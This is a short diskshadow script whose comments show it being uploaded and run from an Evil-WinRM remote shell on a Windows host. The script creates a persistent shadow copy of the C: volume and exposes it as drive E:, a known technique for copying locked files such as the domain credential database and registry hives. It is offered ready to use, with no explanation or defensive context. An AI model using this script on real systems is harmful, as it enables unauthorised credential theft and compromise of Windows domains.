# Run these first if diskshadow is used in non-interactive moded

# *Evil-WinRM* PS C:\ $script = "./tmp.dsh"
# *Evil-WinRM* PS C:\ Get-Content diskshadow.dsh | Set-Content $script
# *Evil-WinRM* PS C:\ diskshadow /s $script

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
